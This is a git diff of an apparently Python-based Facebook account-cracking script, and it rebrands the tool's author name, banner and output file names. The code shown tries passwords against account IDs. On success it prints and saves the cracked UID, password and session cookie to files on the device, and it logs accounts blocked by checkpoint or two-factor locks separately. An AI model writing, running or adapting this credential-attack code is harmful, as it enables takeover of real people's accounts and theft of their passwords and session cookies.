@@ -9,7 +9,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python Kashif.py')
+    os.system('python Bhatti.py')
 from bs4 import BeautifulSoup
 ugen = []
 A = '\x1b[1;97m' 
@@ -71,8 +71,8 @@ def clear():
     os.system('clear')
     print(logo)
 logo =f"""____________________
-AUTHOR    : MR JADUGAR GAMERS
-FACEBOOK : KASHIF BALOCH
+AUTHOR    : MR SWAG BHATTI
+FACEBOOK : SWAG BHATTI
 VERSION    : 1.1
                                    [THE DEAD USER]
 ____________________"""
@@ -136,10 +136,10 @@ def xyz():
     print(f"[00] {WHITE}EXIT PROGRAM ")
     print(f"")
     print(f"\033[1;91m========================================================")
-    Kashif = input("[√] CHOOSE : ")
-    if Kashif in ["1","01"]:
+    Bhatti = input("[√] CHOOSE : ")
+    if Bhatti in ["1","01"]:
         Random()
-    elif Kashif in ["0","00"]:
+    elif Bhatti in ["0","00"]:
        exit()
     else:
         print('\033[1;31mINCORECT OPTION!\033[1;31m')
@@ -232,15 +232,15 @@ def free(uid,pwx,tl):
                 cid = coki[7:22]
                 print('\r\033[1;32m[√]---------------------[JADU-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                 cek_apk(session,coki)
-                open('/sdcard/Jadugar-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/bhatti-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid=coki[24:39]
                 Red = '\033[1;31m'
-                print(f'\r{Red}[×]--------------------[JADU-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
-                open('/sdcard/Jadugar-CP.txt', 'a').write(cid+' | '+ps+'\n')
+                print(f'\r{Red}[×]--------------------[SWAG-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
+                open('/sdcard/bhatti-CP.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             elif '/x/checkpoint' in log_cookies:
@@ -248,12 +248,12 @@ def free(uid,pwx,tl):
                 cid=coki[7:22]
                 Red = '\033[1;31m'
                 print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
-                open('/sdcard/Jadugar-2F.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/jadugar-2F.txt', 'a').write(cid+' | '+ps+'\n')
                 twf.append(cid)
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[JADUGAR] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
+        sys.stdout.write(f'\r\33[1;37m[BHATTI] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
         sys.stdout.flush()
         checks(oks,cps,twf)
     except:
